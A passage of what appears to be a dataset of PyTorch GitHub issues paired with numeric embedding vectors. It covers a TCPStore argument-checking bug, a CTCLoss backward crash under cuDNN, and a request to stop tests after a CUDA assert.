  2.68186688e-01  7.53993869e-01  5.17200351e-01 -5.26362769e-02
  3.68095785e-02  2.93317795e-01  2.92592824e-01  4.29919437e-02
 -2.09873229e-01 -3.31689827e-02 -3.50391209e-01 -3.15740645e-01
 -8.82409588e-02 -9.37760398e-02 -2.11895257e-01  4.39679101e-02
  5.23376986e-02 -3.00721265e-02  3.66204008e-02  1.38346344e-01
 -9.65333283e-02  5.12273163e-02  2.38383248e-01 -9.04493704e-02
  1.16233692e-01  1.37436599e-01 -4.82218564e-01 -4.43295002e-01
 -2.45375842e-01  1.49166793e-01 -3.34838867e-01 -3.39598387e-01
 -1.16917491e-01 -2.85668015e-01  8.29024613e-02  7.97896907e-02
 -1.34362921e-01  6.85055852e-02  1.35087043e-01  1.43231496e-01
  2.78008640e-01  1.18953228e-01  2.47278467e-01 -2.37309232e-01
  3.82946074e-01  9.90079343e-02  2.26938631e-02 -3.50942969e-01
  9.11738127e-02 -3.18243951e-02  6.35609031e-02 -2.21876815e-01
  1.40697971e-01  5.65920696e-02 -2.80995280e-01  4.41157192e-01
  9.97627005e-02 -1.78636789e-01 -2.11107790e-01  3.44545171e-02
 -5.06314412e-02  7.81886131e-02  1.16685465e-01 -5.03798425e-02
  5.40096126e-02  3.98759514e-01 -2.58887172e-01 -5.78957722e-02
 -2.34088168e-01 -1.55289918e-01  1.88375950e-01 -7.09546655e-02
 -2.78621763e-01 -9.66544300e-02  2.99710274e-01  4.95966710e-02
  7.81626552e-02 -1.11996725e-01 -2.08357528e-01  5.73939085e-02
  5.54043800e-06  3.24682057e-01 -6.65305927e-02  8.54287148e-02
  3.63233179e-01 -6.82944059e-03 -1.22446731e-01  2.46180862e-01
 -7.67742246e-02  1.44768273e-02  1.89218670e-02 -3.54679048e-01
  2.85343289e-01 -1.15933698e-02  3.05198252e-01 -3.56984258e-01
  2.67720520e-01 -5.54408431e-02  2.94593871e-01 -1.88086867e-01
  2.29666829e-01  2.68743813e-01 -5.26487380e-02  1.11206425e-02
  6.48748040e-01 -4.23877746e-01 -6.12962954e-02  1.53830975e-01
 -1.66823655e-01 -1.89254820e-01 -6.81569502e-02  9.30823982e-02
  5.65915227e-01 -6.67747855e-02 -2.82429993e-01 -5.24717830e-02
  1.31399438e-01  1.65058568e-01  2.63071924e-01  5.14947027e-02
 -2.79664338e-01  4.38629240e-02  1.00887179e-01 -6.52321577e-02
 -2.76528090e-01 -1.97445035e-01  1.49431109e-01  1.01260051e-01
  5.63884020e-01 -2.75353611e-01  3.33425820e-01  1.10140949e-01
 -2.74628460e-01  3.92599583e-01  1.01896022e-02  1.34888232e-01
  3.40487286e-02  1.49804354e-01  3.05880457e-01  4.84271832e-02
 -8.03453699e-02 -5.63418269e-01 -3.91963482e-01 -1.42535239e-01
 -1.00304976e-01  9.06690210e-02 -1.62751466e-01  2.30357528e-01
 -1.05658911e-01  1.36200413e-01  2.36931622e-01  1.23595625e-01
  5.47462523e-01  2.47682497e-01 -1.47713348e-01 -9.72651169e-02
 -1.97442651e-01  1.56027734e-01  2.49821283e-02 -9.77408364e-02
 -4.32653069e-01 -2.00527430e-01 -1.29363939e-01 -2.43558764e-01
 -7.81233832e-02 -9.79250520e-02  2.78810263e-01  2.66475558e-01
 -1.29892915e-01 -1.95332795e-01  4.67229299e-02 -1.30246252e-01
  1.43750623e-01  1.38247758e-01 -9.98503044e-02  3.65962684e-01
  1.42120242e-01  1.92895859e-01  1.11044720e-01 -1.08703867e-01
 -2.42580194e-02  1.34386599e-01 -3.89727324e-01 -2.51680672e-01
 -7.55173117e-02 -4.42815945e-02 -1.23259932e-01  5.72463982e-02
  1.05545059e-01  8.39893594e-02 -2.80991375e-01  1.33628368e-01
 -9.89948958e-02  5.09654433e-02  5.77757359e-01 -2.36343145e-01
 -4.45807427e-02 -1.38468802e-01  4.30680141e-02 -1.20791174e-01
  8.26882720e-02  3.45341861e-01  1.36800379e-01 -2.14557096e-01]"
TCPStore constructor arguments mismatch unexpected behavior high priority triage review oncall: distributed triaged,"## ðŸ› Bug

TCPStore arguments are likely not properly type checked. [Documentation](https://pytorch.org/docs/1.7.0/distributed.html#torch.distributed.TCPStore) examples also needs to be updated to use 5 arguments instead of 4.

## To Reproduce

Steps to reproduce the behavior:

```
import torch.distributed as dist
import datetime

dist.TCPStore(""127.0.0.1"", 0, True, timedelta(seconds=30))
```
This is the example given in documentation, which succeeds, but it shouldn't.

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

We expect an error like

```
TypeError: __init__(): incompatible constructor arguments. The following argument types are supported:
    1. torch._C._distributed_c10d.TCPStore(host_name: str, port: int, world_size: int, is_master: bool, timeout: datetime.timedelta = datetime.timedelta(seconds=300))
```

## Environment

 - PyTorch Version (e.g., 1.0): master branch
 - OS (e.g., Linux): Ubuntu 18.04.3 LTS (x86_64)
 - Python version: 3.8

cc: @osalpekar 


cc @ezyang @gchanan @zou3519 @bdhirsh @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @agolynski @SciPioneer @H-Huang @mrzzd",True,"[-0.583444   -0.10257185 -0.17982614 -0.14344186 -0.02098622 -0.09546835
 -0.18033147  0.19993162 -0.27205557 -0.15537985 -0.17589244  0.28448308
  0.00874616  0.17707247  0.03899311  0.04202684  0.16673504 -0.33103776
  0.02424014 -0.01950002  0.01933804 -0.00169132 -0.35785437 -0.07905133
 -0.04412576 -0.07151875 -0.22832915 -0.37664276  0.24570836 -0.01092219
 -0.0941484   0.20510483 -0.34802324 -0.09999859  0.08255687 -0.18285474
 -0.42471665 -0.01255819  0.02083179  0.05378657  0.21132608  0.19619894
 -0.27671492  0.00712695 -0.32747573 -0.23233682 -0.2514236   0.36078176
 -0.3898604  -0.07226291 -0.16386826  0.3499149  -0.12515026 -0.10910685
  0.01446293 -0.20876373 -0.24982639 -0.0881719   0.11063749 -0.14776152
  0.2807043  -0.19194236  0.03638617  0.00336407  0.2513257   0.11846284
  0.09023488  0.07108729  0.4666641  -0.1130259  -0.14036457  0.15640536
 -0.11709434  0.14645234  0.27125216 -0.22566158 -0.45476687  0.09317995
 -0.01027017 -0.27300745  0.20093842 -0.10538323 -0.14701432 -0.03097361
  0.082366   -0.27346826  0.35140672 -0.13193709  0.39044142  0.29774636
  0.30420214  0.13597597  0.01256981  0.23165809 -0.30650157  0.26609564
  0.02306391 -0.11348148  0.0411288  -0.19631875  0.01040998 -0.47632632
 -0.02712972  0.06997076  0.20615579 -0.3219426   0.02511008  0.1339355
  0.23912379 -0.04401968 -0.05856999  0.26508772 -0.13172665 -0.31308025
 -0.46692136  0.27987328  0.06473915 -0.12337615  0.2032732   0.05115594
  0.0813683   0.03371084 -0.046077    0.31783068  0.37002498  0.3188262
 -0.01158984 -0.12423089 -0.18823993 -0.06752659 -0.02777854 -0.00091163
  0.20303215 -0.2595861   0.5168154   0.12864868 -0.3762478  -0.24492806
 -0.00930107  0.02076646 -0.16954055  0.03069094 -0.13374154 -0.09010081
 -0.12532768  0.2518169  -0.19527476 -0.01047383 -0.04161187 -0.02028469
  0.10801497  0.1330528  -0.64157057  0.35097596 -0.15404361  0.10980713
  0.28531083 -0.11971971  0.42022514 -0.07627474 -0.03658696  0.58637047
  0.08612093  0.16802654  0.1252397  -0.0055769   0.16550377  0.08862605
 -0.4565701   0.04528537 -0.04059384 -0.19636741 -0.07378348 -0.4411478
 -0.10311048  0.06031846 -0.09734929 -0.21250027  0.04439696  0.27851638
  0.35181227  0.49002814  0.25750035  0.29067546 -0.11516502 -0.15784854
  0.24549371 -0.01518882  0.01089535 -0.029761   -0.3789349  -0.15744457
  0.06617551 -0.0911155  -0.14948231 -0.04957594  0.21103907 -0.07663742
  0.35551977 -0.05607395  0.17906037  0.12137005  0.24404037 -0.01561088
  0.14201808  0.20688012 -0.19134536 -0.32461667  0.04302873 -0.21326979
 -0.12354466  0.06952024 -0.04016058 -0.4655962  -0.22181907  0.27463737
 -0.13667876  0.1897812   0.30900145  0.3352945   0.03391075  0.02437732
  0.23929602 -0.0140995   0.16308108  0.15776454  0.08526256  0.24276978
 -0.12408872 -0.28704634 -0.22202429 -0.34314728  0.5458224  -0.01186674
 -0.05609319  0.24224512 -0.06450383  0.07700893  0.0386474  -0.04329297
  0.15418312 -0.08900189  0.03133987 -0.49266374 -0.08158088  0.02810249
 -0.3685915   0.22536509 -0.04352576 -0.16070794 -0.26240802 -0.01918381
  0.23666316 -0.11646612  0.15737142  0.10859331  0.11509363 -0.15004689
 -0.04852097 -0.05665027  0.1590085   0.5446344   0.16962373  0.21056677
  0.37424463 -0.15266296 -0.08794253 -0.14021814  0.10537277 -0.0912012
  0.18615395 -0.23421657  0.36237955  0.18601587  0.24946216 -0.01702117
  0.41917065 -0.30864656 -0.00463055  0.13082677  0.25567177  0.22235778
  0.07205183  0.09122592  0.25965783 -0.20844239 -0.0593827  -0.22352102
 -0.17185247 -0.16569504  0.03401277 -0.38134685  0.35485762  0.08681317
 -0.06742027  0.07059921 -0.12420109 -0.54115397  0.26026532  0.21360452
 -0.06948352  0.21917853  0.23048028 -0.17580518 -0.08164151  0.18515036
  0.07225639  0.04500353  0.11678427 -0.4053038   0.12412082  0.13469651
 -0.15050396  0.21137232 -0.16319047  0.36571822 -0.39700997  0.3729016
 -0.02455007  0.14932948  0.2105222  -0.14652906 -0.36910248  0.01267428
  0.14248234  0.25651032  0.04136936  0.16157047  0.11284892  0.07609309
 -0.08574066  0.27369398  0.2313132   0.00788629 -0.02638841 -0.44185844
 -0.30651516  0.168551   -0.12768805 -0.18899485 -0.31861132  0.03193849
 -0.03120026 -0.05931094 -0.09668013 -0.05462453  0.3293386   0.2504166
  0.20061602  0.12616333 -0.07426517 -0.06735813 -0.45545623  0.05175421
 -0.09537745  0.13571978 -0.16565025 -0.19668405  0.08887643  0.2034995
 -0.10743883  0.21988799 -0.40237677  0.00324629  0.11338814 -0.19563317
 -0.29048282 -0.07104651  0.2983698   0.24287388 -0.32525292 -0.01372791
 -0.17871219 -0.13930598  0.09189963 -0.13218348  0.13701218 -0.36549914
  0.2808021  -0.24041125 -0.26667     0.1066603   0.20361029  0.01498064]"
Backward pass fails due to CTCLoss in case zero_infinity=True and torch.backends.cudnn.enabled=True module: dependency bug module: cudnn module: loss triaged,"## ðŸ› Bug

When I use CTCLoss with `zero_infinity=True` and at the same time `torch.backends.cudnn.enabled=True`, and run backward() on its result, the script crashes with the following error:

```
Traceback (most recent call last):
  ...
  File "".../new_ctc_loss_bug.py"", line 29, in <module>
    loss.backward()
  File ""...\Anaconda3\envs\my-env\lib\site-packages\torch\tensor.py"", line 185, in backward
    torch.autograd.backward(self, gradient, retain_graph, create_graph)
  File ""...\Anaconda3\envs\my-env\lib\site-packages\torch\autograd\__init__.py"", line 127, in backward
    allow_unreachable=True)  # allow_unreachable flag
RuntimeError: The size of tensor a (0) must match the size of tensor b (177) at non-singleton dimension 2
Exception raised from infer_size at ..\aten\src\ATen\ExpandUtils.cpp:24 (most recent call first):
00007FFAED8175A200007FFAED817540 c10.dll!c10::Error::Error [<unknown file> @ <unknown line number>]
00007FFAC311B0EB00007FFAC311AED0 torch_cpu.dll!at::infer_size [<unknown file> @ <unknown line number>]
00007FFAC338617400007FFAC3385DC0 torch_cpu.dll!at::native::DispatchStub<void (__cdecl*)(at::Tensor & __ptr64,at::Tensor & __ptr64,at::Tensor const & __ptr64,__int64,bool),at::native::min_stub>::choose_cpu_impl [<unknown file> @ <unknown line number>]
00007FFAC338902400007FFAC3388F00 torch_cpu.dll!at::native::where [<unknown file> @ <unknown line number>]
00007FFAC36AF6A700007FFAC361D060 torch_cpu.dll!at::zeros_out [<unknown file> @ <unknown line number>]
00007FFAC49AB50E00007FFAC485E010 torch_cpu.dll!torch::autograd::GraphRoot::apply [<unknown file> @ <unknown line number>]
00007FFAC3150BFF00007FFAC3146470 torch_cpu.dll!torch::nn::functional::BatchNormFuncOptions::~BatchNormFuncOptions [<unknown file> @ <unknown line number>]
00007FFAC35BC66600007FFAC35B8FA0 torch_cpu.dll!at::bucketize_out [<unknown file> @ <unknown line number>]
00007FFAC361CBF400007FFAC361CB90 torch_cpu.dll!at::where [<unknown file> @ <unknown line number>]
00007FFAC479D46A00007FFAC479CE80 torch_cpu.dll!torch::autograd::Node::`default constructor closure' [<unknown file> @ <unknown line number>]
00007FFAC47AB75B00007FFAC47AB5B0 torch_cpu.dll!torch::autograd::generated::CudnnCtcLossBackward::apply [<unknown file> @ <unknown line number>]
00007FFAC4797E9100007FFAC4797B50 torch_cpu.dll!torch::autograd::Node::operator() [<unknown file> @ <unknown line number>]
00007FFAC4CFF9BA00007FFAC4CFF300 torch_cpu.dll!torch::autograd::Engine::add_thread_pool_task [<unknown file> @ <unknown line number>]
00007FFAC4D003AD00007FFAC4CFFFD0 torch_cpu.dll!torch::autograd::Engine::evaluate_function [<unknown file> @ <unknown line number>]
00007FFAC4D04FE200007FFAC4D04CA0 torch_cpu.dll!torch::autograd::Engine::thread_main [<unknown file> @ <unknown line number>]
00007FFAC4D04C4100007FFAC4D04BC0 torch_cpu.dll!torch::autograd::Engine::thread_init [<unknown file> @ <unknown line number>]
00007FFA66C9090700007FFA66C69FE0 torch_python.dll!THPShortStorage_New [<unknown file> @ <unknown line number>]
00007FFAC4CFBF1400007FFAC4CFB780 torch_cpu.dll!torch::autograd::Engine::get_base_engine [<unknown file> @ <unknown line number>]
00007FFB1C9F10B200007FFB1C9F0F70 ucrtbase.dll!beginthreadex [<unknown file> @ <unknown line number>]
00007FFB1E3B7C2400007FFB1E3B7C10 KERNEL32.DLL!BaseThreadInitThunk [<unknown file> @ <unknown line number>]
00007FFB1EC0D4D100007FFB1EC0D4B0 ntdll.dll!RtlUserThreadStart [<unknown file> @ <unknown line number>]
```

## To Reproduce

Steps to reproduce the behavior:

1. Download the file with variables  https://drive.google.com/file/d/1eltV2WjDVTuRBXO0n6E5t5dkQ3GEW6Qj/view?usp=sharing
1. Run the code:
``` python
import torch
import pickle


assert torch.cuda.is_available() and torch.backends.cudnn.enabled

# https://drive.google.com/file/d/1eltV2WjDVTuRBXO0n6E5t5dkQ3GEW6Qj/view?usp=sharing
with open('ctc_bug.pkl', 'rb') as f:
    variables = pickle.load(f)

log_probs = variables['log_probs'].cuda()
targets = variables['targets'].cpu()
target_lengths = variables['target_lengths'].cuda()

# with `zero_infinity=False` it works well
ctc_loss = torch.nn.CTCLoss(zero_infinity=True).cuda()

assert torch.isfinite(log_probs.max()) and torch.isfinite(log_probs.min())

# with `torch.backends.cudnn.enabled = False` it works well
T, N, C = log_probs.shape
loss = ctc_loss(
    log_probs=log_probs,
    targets=targets,
    input_lengths=torch.full(size=(N,), fill_value=T, dtype=torch.int32).cuda(),
    target_lengths=target_lengths
)
assert torch.isfinite(loss)
loss.backward()

```

## Expected behavior

No crash

## Environment

```
PyTorch version: 1.6.0
Is debug build: False
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A
OS: Microsoft Windows 10 Home Single Language
GCC version: Could not collect
Clang version: Could not collect
CMake version: Could not collect
Python version: 3.6 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.0.130
GPU models and configuration: GPU 0: GeForce MX150
Nvidia driver version: 451.67
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A
Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] numpydoc==0.8.0
[pip3] torch==1.6.0
[pip3] torchvision==0.7.0
[conda] blas                      1.0                         mkl  
[conda] cudatoolkit               10.2.89              h74a9793_1  
[conda] libblas                   3.8.0                    16_mkl    conda-forge
[conda] libcblas                  3.8.0                    16_mkl    conda-forge
[conda] liblapack                 3.8.0                    16_mkl    conda-forge
[conda] mkl                       2020.1                      216  
[conda] numpy                     1.19.1           py36h12ee977_2    conda-forge
[conda] numpydoc                  0.8.0                    py36_0  
[conda] pytorch                   1.6.0           py3.6_cuda102_cudnn7_0    pytorch
[conda] torchvision               0.2.1                    pypi_0    pypi

Python 3.6.8
print(torch.cuda.get_device_properties(0))
_CudaDeviceProperties(name='GeForce MX150', major=6, minor=1, total_memory=2048MB, multi_processor_count=3)
print('CUDA version:', torch.version.cuda)
CUDA version: 10.2
print('CUDNN version:', torch.backends.cudnn.version())
CUDNN version: 7605
```

## Additional context

I am also able to reproduce the error with the following configuration:
```
PyTorch version: 1.7.0
Is debug build: True
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A
OS: ÐŠÂ Â©Ð„Ð°Â®Ð±Â®Ð´Ð² Windows 10 Pro
GCC version: Could not collect
Clang version: Could not collect
CMake version: Could not collect
Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.1.105
GPU models and configuration: GPU 0: GeForce GTX 1080
Nvidia driver version: 441.28
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A
Versions of relevant libraries:
[pip3] numpy==1.19.4
[pip3] torch==1.7.0
[pip3] torchaudio==0.7.0
[pip3] torchvision==0.8.1
[conda] Could not collect

Python 3.7.9
print(torch.cuda.get_device_properties(0))
_CudaDeviceProperties(name='GeForce GTX 1080', major=6, minor=1, total_memory=8192MB, multi_processor_count=20)
print('CUDA version:', torch.version.cuda)
CUDA version: 10.2
print('CUDNN version:', torch.backends.cudnn.version())
CUDNN version: 7605

```

__But (!) with the following configuration everything works fine:__
```
PyTorch version: 1.1.0
Is debug build: False
CUDA used to build PyTorch: 10.0
ROCM used to build PyTorch: N/A
OS: ÐŠÂ Â©Ð„Ð°Â®Ð±Â®Ð´Ð² Windows 10 Pro
GCC version: Could not collect
Clang version: Could not collect
CMake version: Could not collect
Python version: 3.6 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.1.105
GPU models and configuration: GPU 0: GeForce GTX 1080
Nvidia driver version: 441.28
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A
Versions of relevant libraries:
[pip3] numpy==1.19.4
[pip3] torch==1.1.0
[conda] Could not collect

Python 3.6.8
print(torch.cuda.get_device_properties(0))
_CudaDeviceProperties(name='GeForce GTX 1080', major=6, minor=1, total_memory=8192MB, multi_processor_count=20)
print('CUDA version:', torch.version.cuda)
CUDA version: 10.0
print('CUDNN version:', torch.backends.cudnn.version())
CUDNN version: 7401

```


cc @csarofeen @ptrblck",True,"[-6.36760354e-01  5.23311645e-03 -1.21010162e-01  3.02730836e-02
 -1.35814101e-01 -3.61580849e-01 -1.79922521e-01  3.41572165e-01
 -3.39806557e-01  4.92009073e-02  9.75882560e-02 -1.09767303e-01
  3.50197144e-02  2.82063037e-02 -2.23102063e-01  1.25930786e-01
 -2.57292628e-01  5.08438721e-02  1.27172358e-02  3.55422795e-02
 -1.28018916e-01 -3.58518325e-02 -1.71175003e-01  8.23275596e-02
  1.36393700e-02 -4.36682627e-02 -3.53424519e-01 -1.21838331e-01
  4.16294098e-01  2.03363691e-02 -7.60488119e-03 -2.72149831e-01
 -6.38351440e-01 -6.50911219e-03  2.44544730e-01 -2.22727880e-02
 -5.92818022e-01 -6.44141585e-02 -1.21364892e-01 -2.04025030e-01
 -6.75704405e-02  3.59617978e-01 -1.15711793e-01  4.80695739e-02
 -3.27234492e-02 -1.88309342e-01 -7.72434846e-02  9.61065069e-02
 -6.64268881e-02 -5.30415773e-02  4.48353350e-01  3.68756980e-01
 -1.27127081e-01 -1.66783661e-01 -2.01799810e-01  7.24911839e-02
 -3.70112956e-01  2.95091689e-01  1.73355848e-01 -9.25677568e-02
  4.62214828e-01  6.51288852e-02 -1.72754928e-01 -1.10919558e-01
  9.86298248e-02  8.82893205e-02 -1.64289892e-01 -1.03850886e-01
  3.25537503e-01  8.67529120e-03  1.77923888e-01  5.17132655e-02
 -9.41376984e-02  5.69488071e-02  2.06063241e-01 -8.28163177e-02
 -2.30258390e-01  2.33445048e-01 -5.42552948e-01 -1.69919655e-01
  3.01721543e-01  1.80794567e-01  4.33448143e-02  1.92330852e-02
  3.77329916e-01  1.44039810e-01  2.00260401e-01 -2.33419448e-01
  5.40819705e-01  4.09243675e-03  8.40936229e-02  2.08995491e-01
 -1.38425559e-01  2.70519674e-01 -8.96961838e-02 -3.34632210e-03
  2.79819757e-01  2.40474120e-01 -3.31667006e-01 -1.85650200e-01
  4.89245355e-02 -3.45518947e-01 -3.26857716e-01  1.77332133e-01
  1.94130868e-01  1.73060615e-02  4.43203568e-01  7.42577761e-02
  1.58944763e-02 -1.55098051e-01  2.92204678e-01  1.38081342e-01
  9.22501087e-02 -2.52659142e-01 -1.01445792e-02 -6.53013363e-02
 -6.22392669e-02 -1.02961041e-01 -3.46253395e-01  1.76572055e-01
  9.42189693e-02  1.29921094e-01 -2.69191623e-01  1.97555378e-01
  6.13590121e-01 -7.68461823e-03  9.90019552e-03 -4.49714400e-02
 -1.98138189e-02  6.22694381e-04  9.46710259e-02  1.10544264e-03
  9.76077989e-02 -1.31577715e-01  2.24328339e-01  8.24542046e-02
 -4.38568890e-01  2.01132149e-03 -1.89693913e-01 -2.39131600e-01
 -2.65417367e-01 -2.41224542e-01 -9.19840857e-02 -2.08386585e-01
  2.16963783e-01 -2.65827715e-01 -1.62407175e-01  5.85533231e-02
  2.14847311e-01  1.29961461e-01  1.97020788e-02 -7.81939849e-02
 -4.52872723e-01  2.91065156e-01 -1.79433882e-01  2.74974525e-01
  2.07553685e-01 -1.15039244e-01  1.66985720e-01 -5.73410571e-01
  4.37457949e-01  3.75551641e-01  2.36319751e-01  1.82695329e-01
  4.03794870e-02 -3.07356399e-02 -1.65336002e-02  2.64650047e-01
 -5.39328098e-01  1.67804286e-02 -1.22283280e-01 -2.87737131e-01
 -2.23824941e-03 -2.68255442e-01  1.63075164e-01  8.10827315e-02
 -1.80027083e-01 -2.91250169e-01 -2.65647620e-01  6.40772700e-01
 -1.62923895e-02  3.70923221e-01  1.72969047e-02  4.16946337e-02
  4.95591238e-02  2.33836532e-01  4.06823866e-02  6.68699220e-02
 -6.77529536e-03 -9.47398171e-02 -2.53359348e-01 -6.67468756e-02
 -9.76865590e-02 -8.66262168e-02 -7.44480044e-02  2.62112860e-02
  5.15546352e-02 -2.83108056e-01  5.38613945e-02  4.43393663e-02
 -3.74289989e-01  2.55095027e-03  4.19229001e-01 -1.28310144e-01
  1.72129106e-02 -5.56016192e-02 -1.30369142e-01 -3.98408473e-01
 -9.65678394e-02 -2.76955575e-01 -3.63949776e-01 -1.16912529e-01
  1.54443517e-01 -8.01700801e-02  1.07019268e-01 -6.21133484e-02
  1.03409523e-02  6.86235428e-02  1.86622471e-01  1.54223675e-02
  5.83780527e-01  1.09537996e-01  1.64786220e-01 -1.38647765e-01
  1.89013481e-01  3.72980803e-01 -3.76308896e-02 -3.53875719e-02
 -1.14282638e-01  3.63749173e-03 -1.30987450e-01 -3.07365239e-01
 -2.13248767e-02  1.48680240e-01  2.73528188e-01  5.51735640e-01
 -4.68286686e-02 -1.04273185e-02 -1.03492275e-01  1.48826182e-01
 -9.40606818e-02 -1.78076878e-01  7.33846948e-02 -4.68497761e-02
  2.23920658e-01  5.06960638e-02 -4.85568643e-01 -4.02639396e-02
 -7.85848796e-02  8.00560862e-02 -2.31878489e-01  8.00393801e-03
  2.15893425e-02 -2.41826981e-01  1.35946378e-01  4.08229589e-01
  2.59266704e-01 -1.88687891e-01 -9.47056860e-02 -1.65711306e-02
 -6.01872988e-02  1.00164093e-01 -7.76146948e-02 -1.38638820e-03
  2.12941214e-01 -1.07394375e-01  5.69837540e-02  1.50396466e-01
 -6.35441840e-02 -1.15333259e-01  1.69423670e-01 -2.00331986e-01
  4.96323556e-01  1.18293585e-02  3.92549515e-01 -2.62483597e-01
  5.21115899e-01 -2.77024843e-02  2.18003899e-01  1.12144977e-01
  1.63982004e-01  1.73621565e-01 -9.68959481e-02  2.02042103e-01
  3.85496616e-01 -2.45389462e-01 -1.46398991e-01 -7.31151272e-03
  6.04001470e-02 -2.06192434e-01 -2.48397410e-01 -5.15453294e-02
  2.48292863e-01 -1.31425411e-01 -2.31352165e-01  7.66756982e-02
 -2.92435307e-02 -4.17278588e-01 -1.25883982e-01  2.02593774e-01
 -1.58158585e-01  1.18789926e-01  1.94815487e-01 -1.95986748e-01
  3.96870933e-02 -2.92785257e-01  3.35173190e-01 -4.28586751e-02
  3.28377485e-01 -3.30456316e-01  1.21793315e-01 -5.26000708e-02
 -3.15382361e-01  3.41132253e-01 -9.18320864e-02  2.80535817e-01
  2.18822688e-01  1.00678086e-01  1.83769494e-01  8.14832374e-02
 -6.38359636e-02 -1.84822604e-01 -5.05952299e-01 -1.07163757e-01
  7.72712231e-02  6.57240897e-02  5.58457300e-02  2.28986681e-01
  1.07593477e-01  9.90459844e-02 -3.45445834e-02  1.79104447e-01
  4.74567890e-01 -6.53141513e-02  1.60066187e-02  2.52441745e-02
 -1.29784405e-01  2.15170681e-01  1.83461562e-01 -2.55266637e-01
 -4.77682531e-01  2.40488164e-02 -2.07005411e-01 -2.34850138e-01
 -7.71441311e-02 -2.54947543e-01  1.58657283e-01  5.52582741e-01
 -1.57390296e-01  2.92888463e-01  4.81030904e-02 -4.30889428e-01
 -6.82958439e-02  1.20502263e-01 -2.39643469e-01  3.53675574e-01
  5.19302189e-02  3.76599468e-02  4.42124344e-03  1.66881293e-01
  5.07187359e-02  4.13762182e-01 -3.05438459e-01 -2.44192451e-01
 -1.64472267e-01 -2.59474635e-01  8.94805789e-02 -6.15047812e-02
  1.89899534e-01 -2.59745240e-01 -2.07182288e-01  1.89556479e-02
 -1.36923075e-01 -1.33117307e-02  3.70011330e-01 -7.49276280e-02
  8.43830630e-02  4.45291912e-03 -3.20699178e-02 -6.03937544e-02
  3.73239666e-02  3.74630511e-01 -1.11487567e-01  6.11430109e-02]"
"If test suite triggers CUDA assert, should stop running tests module: cuda module: tests triaged","Every test after the CUDA assert will fail, but only the first test will be relevant. It would be more user friendly to immediately halt the test suite the first time a CUDA assert fails.

cc @ngimel @mruberry @VitalyFedyunin @walterddr",True,"[-2.81260729e-01  6.83632717e-02 -2.42386445e-01 -1.17378585e-01
  4.03817147e-02  5.38751222e-02 -1.23957410e-01 -1.83939204e-01
 -2.53453106e-01 -1.34198830e-01  2.67879248e-01 -2.99263984e-01
 -6.94871470e-02 -6.60752878e-02 -2.64841229e-01 -1.64746702e-01
 -3.84630352e-01  6.52314723e-02  2.24443469e-02  1.44759387e-01
 -1.39206186e-01  1.56955585e-01 -4.20187324e-01 -3.66997011e-02
 -1.43904284e-01 -1.50607988e-01 -5.81499524e-02 -1.60958901e-01
  3.67881447e-01 -4.10362799e-03  1.79672197e-01  2.90548325e-01
 -1.86808988e-01  2.36517236e-01  1.37027457e-01  4.87543317e-03
 -3.83918613e-01 -3.90645325e-01 -2.91136354e-02 -1.88047513e-01
 -1.49330273e-01 -4.61135179e-01 -1.15544692e-01 -2.62881815e-02
  7.17976177e-03 -1.09997630e-01  1.06878586e-01  2.51595140e-01
 -8.79540965e-02  1.38199050e-02  2.91088261e-02 -4.70494717e-01
  2.53606379e-01 -4.41668898e-01  1.42269477e-01 -2.60986596e-01
  1.55659020e-01  3.38469520e-02 -9.21045765e-02  7.52564371e-02
 -2.41151989e-01  8.33531097e-02 -1.15878232e-01 -4.28166352e-02
  1.43203974e-01  6.04389727e-01 -1.56457022e-01  6.32716948e-03
  5.04252970e-01  5.68142295e-01  9.12565365e-02  2.10839972e-01
 -2.91959316e-01 -2.97893047e-01 -1.97795451e-01  1.86925501e-01
 -2.71304287e-02 -2.18426451e-01  3.68869662e-01  1.08722568e-01
 -1.85699493e-01  9.01850089e-02  2.77949739e-02 -3.23272794e-01
  1.35871898e-02 -2.04493865e-01  2.99922109e-01 -1.59435719e-01
  7.12989494e-02 -2.48341307e-01 -1.02493286e-01 -7.53430203e-02
  1.30576581e-01  4.44763541e-01 -3.13482136e-01  2.31485814e-01
 -2.14499757e-01  5.97232319e-02 -2.38177836e-01 -2.44439114e-02
  1.44566119e-01 -6.83329999e-02 -3.00619602e-01  6.18327796e-01
 -2.60168552e-01 -2.85076320e-01  3.60090733e-01 -3.51393342e-01
 -1.30470887e-01 -1.48541734e-01  2.42707878e-01  1.71622857e-02
  1.82490349e-01  2.55775563e-02 -1.48290336e-01  1.21369161e-01
 -5.15311994e-02  1.06681615e-01  1.25449628e-01 -2.34079361e-01
  6.36887029e-02  5.15947975e-02  1.47235692e-01 -3.06074053e-01
  4.02921915e-01 -2.64079392e-01  6.57406598e-02  1.09668881e-01
 -2.53997058e-01 -2.49623924e-01  8.30573365e-02  4.63753566e-02
  2.42319763e-01 -8.54130983e-02 -5.13892360e-02  4.11801189e-01
 -2.89006084e-01 -1.99081555e-01 -1.10943271e-02 -1.72817469e-01
  8.00746381e-02  1.59402490e-01 -9.28515345e-02  1.14573970e-01
  3.58224630e-01 -1.81952611e-01 -2.23679364e-01  4.89904219e-03
  6.82286993e-02 -7.36252889e-02  1.30928203e-01 -2.14039188e-04
 -3.36796492e-01  2.13003442e-01  1.50140831e-02  5.79435639e-02
  2.45057687e-01  2.63566732e-01 -1.09859593e-01 -3.81067455e-01
  9.57481712e-02  7.03390360e-01  1.41121335e-02  3.59604001e-01
  1.40615404e-01  2.17809975e-01  1.82820819e-02  5.17852837e-03
  3.63874026e-02  2.67338037e-01 -1.57347582e-02 -7.97087997e-02
  2.21247181e-01 -4.78198528e-01 -5.71610853e-02 -3.23588610e-01
 -2.59681433e-01  3.56478393e-02  3.77513051e-01  5.61824560e-01
 -2.43532673e-01  3.27694297e-01  2.61760920e-01  1.21683612e-01
 -6.75994009e-02  4.82070923e-01 -1.69455156e-01  4.30374742e-02
 -1.70341030e-01 -3.04963171e-01 -4.16474402e-01  8.42198282e-02
